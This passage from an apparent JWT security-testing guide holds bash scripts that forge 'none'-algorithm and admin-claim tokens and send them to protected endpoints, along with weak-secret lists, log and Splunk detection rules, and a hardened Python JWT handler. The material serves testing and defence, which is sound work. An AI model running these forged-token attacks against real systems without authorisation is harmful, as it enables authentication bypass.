    echo "[*] Testing JWT vulnerabilities..."

    # Test 1: Decode and analyze token
    echo "[*] Token structure analysis:"
    echo "Header: $(decode_jwt $token header)"
    echo "Payload: $(decode_jwt $token payload)"

    # Test 2: None algorithm attack
    echo "[*] Testing none algorithm attack..."
    local none_token=$(create_none_jwt $token)

    # Test none token against protected endpoints
    local protected_endpoints=("/profile" "/api/user" "/rest/user/whoami")

    for endpoint in "${protected_endpoints[@]}"; do
        response=$(curl -s -w "%{http_code}" \
            -H "Authorization: Bearer $none_token" \
            "$url$endpoint")

        http_code="${response: -3}"
        if [[ "$http_code" == "200" ]]; then
            echo "[!] None algorithm attack successful on $endpoint"
        fi
    done

    # Test 3: Weak secret brute force
    echo "[*] Testing common weak secrets..."
    local weak_secrets=("secret" "key" "jwt" "token" "password" "admin" "123456")

    for secret in "${weak_secrets[@]}"; do
        # This would require jwt_tool or similar - simplified test
        echo "[*] Testing secret: $secret"
    done

    # Test 4: Algorithm confusion
    echo "[*] Testing algorithm confusion..."
    # Extract algorithm from header
    local algorithm=$(decode_jwt $token header | jq -r '.alg' 2>/dev/null)
    echo "[*] Original algorithm: $algorithm"

    # Test 5: Payload manipulation
    echo "[*] Testing payload manipulation..."
    local payload=$(decode_jwt $token payload)
    echo "[*] Original payload claims: $(echo $payload | jq -r 'keys[]' 2>/dev/null | tr '\n' ' ')"
}

# Main testing loop
for i in "${!TARGET_APPS[@]}"; do
    url="${TARGET_APPS[$i]}"
    name="${APP_NAMES[$i]}"

    echo ""
    echo "Testing $name at $url"
    echo "========================================"

    # Check if application is accessible
    if ! curl -s --connect-timeout 5 "$url" > /dev/null; then
        echo "[-] $name is not accessible at $url"
        continue
    fi

    # Test JWT endpoints
    test_jwt_endpoints "$url" "$name"

    # Extract JWT token
    token=$(extract_jwt_token "$url" "$name")

    # Test JWT vulnerabilities
    test_jwt_vulnerabilities "$token" "$url" "$name"

    echo "[*] $name JWT testing complete"
done

echo ""
echo "=== JWT Testing Complete ==="
```

### JWT Analysis Script

```bash
#!/bin/bash
# JWT Token Analysis Script

echo "=== JWT Token Analysis ==="

# Function to analyze JWT structure
analyze_jwt_structure() {
    local token=$1

    echo "Analyzing JWT: ${token:0:50}..."

    # Check if it's a valid JWT format
    local part_count=$(echo $token | tr '.' '\n' | wc -l)
    if [[ $part_count -ne 3 ]]; then
        echo "[!] Invalid JWT format - should have 3 parts separated by dots"
        return 1
    fi

    # Decode header
    echo ""
    echo "=== HEADER ==="
    local header=$(echo $token | cut -d'.' -f1 | base64 -d 2>/dev/null)
    if [[ $? -eq 0 ]]; then
        echo "$header" | jq . 2>/dev/null || echo "$header"

        # Extract algorithm
        local algorithm=$(echo "$header" | jq -r '.alg' 2>/dev/null)
        echo "Algorithm: $algorithm"

        # Check for dangerous algorithms
        case $algorithm in
            "none")
                echo "[!] WARNING: Using 'none' algorithm - no signature verification"
                ;;
            "HS256"|"HS384"|"HS512")
                echo "[*] HMAC algorithm detected - check for weak secrets"
                ;;
            "RS256"|"RS384"|"RS512")
                echo "[*] RSA algorithm detected - check for key confusion attacks"
                ;;
        esac
    else
        echo "[!] Failed to decode header"
    fi

    # Decode payload
    echo ""
    echo "=== PAYLOAD ==="
    local payload=$(echo $token | cut -d'.' -f2 | base64 -d 2>/dev/null)
    if [[ $? -eq 0 ]]; then
        echo "$payload" | jq . 2>/dev/null || echo "$payload"

        # Check expiration
        local exp=$(echo "$payload" | jq -r '.exp' 2>/dev/null)
        if [[ "$exp" != "null" && "$exp" != "" ]]; then
            local current_time=$(date +%s)
            if [[ $exp -lt $current_time ]]; then
                echo "[!] WARNING: Token is expired"
            else
                local time_left=$((exp - current_time))
                echo "[*] Token expires in $time_left seconds"
            fi
        fi

        # Check for admin claims
        if echo "$payload" | grep -q -i "admin\|root\|superuser"; then
            echo "[!] Administrative claims detected"
        fi

        # Check for sensitive data
        if echo "$payload" | grep -q -i "password\|secret\|key"; then
            echo "[!] WARNING: Potentially sensitive data in payload"
        fi

    else
        echo "[!] Failed to decode payload"
    fi

    # Analyze signature
    echo ""
    echo "=== SIGNATURE ==="
    local signature=$(echo $token | cut -d'.' -f3)
    echo "Signature: $signature"
    echo "Signature length: ${#signature}"

    if [[ ${#signature} -eq 0 ]]; then
        echo "[!] WARNING: Empty signature (none algorithm)"
    fi
}

# Function to test common JWT attacks
test_jwt_attacks() {
    local token=$1

    echo ""
    echo "=== ATTACK TESTING ==="

    # Test none algorithm
    echo "[*] Testing none algorithm attack..."
    local header='{"typ":"JWT","alg":"none"}'
    local payload=$(echo $token | cut -d'.' -f2)

    local header_b64=$(echo -n $header | base64 | tr -d '=' | tr '+/' '-_')
    local none_token="${header_b64}.${payload}."

    echo "None algorithm token: ${none_token:0:50}..."

    # Test weak secrets
    echo "[*] Testing common weak secrets..."
    local secrets=("secret" "key" "jwt" "token" "password" "admin" "123456" "qwerty")

    for secret in "${secrets[@]}"; do
        echo "[*] Testing secret: $secret"
        # Note: This would require PyJWT or jwt_tool for actual verification
    done

    # Test payload manipulation
    echo "[*] Testing payload manipulation..."
    local decoded_payload=$(echo $token | cut -d'.' -f2 | base64 -d 2>/dev/null)

    if [[ $? -eq 0 ]]; then
        # Create admin payload
        local admin_payload='{"admin":true,"role":"administrator","exp":9999999999}'
        local admin_payload_b64=$(echo -n $admin_payload | base64 | tr -d '=' | tr '+/' '-_')

        echo "Admin payload token: ${header_b64}.${admin_payload_b64}.invalid_signature"
    fi
}

# Example usage
if [[ $# -eq 0 ]]; then
    echo "Usage: $0 <JWT_TOKEN>"
    echo ""
    echo "Example JWT tokens for testing:"
    echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.ZxW3iM5R0rz6IAzeShARwh8gGdd0vhTy5qbTcNENMh4"
    exit 1
fi

TOKEN=$1

# Analyze the JWT
analyze_jwt_structure "$TOKEN"

# Test common attacks
test_jwt_attacks "$TOKEN"

echo ""
echo "=== Analysis Complete ==="
```

## Detection Methods

### Log Analysis for JWT Attacks

```bash
# Monitor JWT manipulation attempts
grep -i "jwt\|token" /var/log/webapp/access.log | grep -E "(none|admin|manipulation)"

# Check for none algorithm usage
grep "alg.*none" /var/log/webapp/access.log

# Monitor failed JWT verifications
grep -i "jwt.*invalid\|token.*invalid" /var/log/webapp/error.log
```

### SIEM Detection Rules

```yaml
# Splunk: JWT none algorithm detection
index=webapp
| search "alg" AND "none"
| stats count by src_ip
| where count > 1

# JWT manipulation attempts
index=webapp
| search "Authorization: Bearer"
| regex _raw="Authorization: Bearer (?<jwt>[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)"
| eval header=substr(jwt,1,strpos(jwt,".")-1)
| eval header_decoded=base64decode(header)
| search header_decoded="*none*" OR header_decoded="*admin*"
```

## Mitigation Strategies

### 1. Secure JWT Implementation

```python
# Secure JWT handling example
import jwt
import time
from cryptography.hazmat.primitives import serialization

class SecureJWTHandler:
    def __init__(self, private_key_path, public_key_path):
        # Use RSA keys for signing
        with open(private_key_path, 'rb') as f:
            self.private_key = serialization.load_pem_private_key(f.read(), password=None)

        with open(public_key_path, 'rb') as f:
            self.public_key = serialization.load_pem_public_key(f.read())

    def create_token(self, user_data):
        """Create secure JWT token"""
        payload = {
            'sub': user_data['user_id'],
            'iss': 'your-app.com',
            'aud': 'your-app.com',
            'iat': int(time.time()),
            'exp': int(time.time()) + 3600,  # 1 hour
            'nbf': int(time.time()),
            'jti': self.generate_unique_id(),
            'role': user_data.get('role', 'user')
        }

        return jwt.encode(
            payload,
            self.private_key,
            algorithm='RS256',
            headers={'typ': 'JWT', 'alg': 'RS256'}
        )

    def verify_token(self, token):
        """Verify JWT token securely"""
        try:
            # Strict algorithm verification
            payload = jwt.decode(
                token,
                self.public_key,
                algorithms=['RS256'],  # Only allow RS256
                options={
                    'verify_signature': True,
                    'verify_exp': True,
                    'verify_nbf': True,
                    'verify_iat': True,
                    'verify_aud': True,
                    'verify_iss': True,
                    'require': ['exp', 'iat', 'nbf', 'sub', 'iss', 'aud']
                },
                audience='your-app.com',
                issuer='your-app.com'
            )

            # Additional validation
            if not self.is_token_revoked(payload.get('jti')):
                return payload

        except jwt.ExpiredSignatureError:
            raise ValueError("Token has expired")
        except jwt.InvalidTokenError:
            raise ValueError("Invalid token")

        return None
```

### 2. JWT Security Best Practices

```python
# JWT security configuration
JWT_CONFIG = {
    # Algorithm whitelist
    'ALLOWED_ALGORITHMS': ['RS256', 'RS384', 'RS512'],

    # Never allow these
    'FORBIDDEN_ALGORITHMS': ['none', 'HS256'],

    # Token settings
    'ACCESS_TOKEN_LIFETIME': 900,  # 15 minutes
    'REFRESH_TOKEN_LIFETIME': 86400,  # 24 hours

    # Required claims
    'REQUIRED_CLAIMS': ['exp', 'iat', 'nbf', 'sub', 'iss', 'aud', 'jti'],

    # Validation settings
    'VERIFY_SIGNATURE': True,
    'VERIFY_EXPIRATION': True,
    'VERIFY_NOT_BEFORE': True,
    'VERIFY_ISSUED_AT': True,
    'VERIFY_AUDIENCE': True,
    'VERIFY_ISSUER': True,

    # Security headers
    'HEADERS': {
        'typ': 'JWT',
        'alg': 'RS256'
    }
}
```

## Legal and Ethical Considerations

⚠️ **WARNING**: These techniques are for authorized testing only:

- Only test applications you own or have explicit permission to test
- JWT manipulation can cause authentication bypass - use responsibly
- Document all testing activities and findings
- Follow responsible disclosure for vulnerabilities found
- Comply with applicable laws and regulations

## References

- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [OWASP JWT Security](<https://owasp.org/www-community/vulnerabilities/JSON_Web_Token_(JWT)_Cheat_Sheet_for_Java>)
- [JWT.io Debugger](https://jwt.io/)
- [Common JWT Vulnerabilities](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [JWT Attack Techniques](https://portswigger.net/web-security/jwt)
